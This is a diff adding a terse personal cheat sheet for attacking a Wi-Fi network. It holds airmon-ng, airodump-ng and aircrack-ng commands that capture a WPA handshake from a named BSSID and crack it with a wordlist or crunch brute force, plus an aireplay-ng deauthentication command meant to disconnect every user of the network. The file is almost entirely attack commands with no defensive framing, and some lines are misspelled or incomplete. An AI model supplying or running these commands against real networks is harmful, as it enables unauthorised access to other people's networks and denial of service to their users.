@@ -1,0 +1,22 @@
+TERMINAL---1
+iwcnfig
+airmon-ng start wlan0
+airodump-ng wlan0 
+airodump-ng --bssid 
+airodump-ng --bssid A2:AB:12:8C:7C:7E --channel 11 --write FILEname wlan0
+
+
+
+aircrack-ng -w wordlist.txt wlan0 FILEname-01.cap
+
+
+
+crunch 8 8 | aircrack-ng -w - -b A2:AB:12:8C:7C:7E FILEname.cap      (crunch is a dictonary)
+
+
+
+
+TERMINAL---2
+for discunnect all the network users-----
+
+aireplay-ng --deauth 20 -a A2:AB:12:8C:7C:7E wlan0
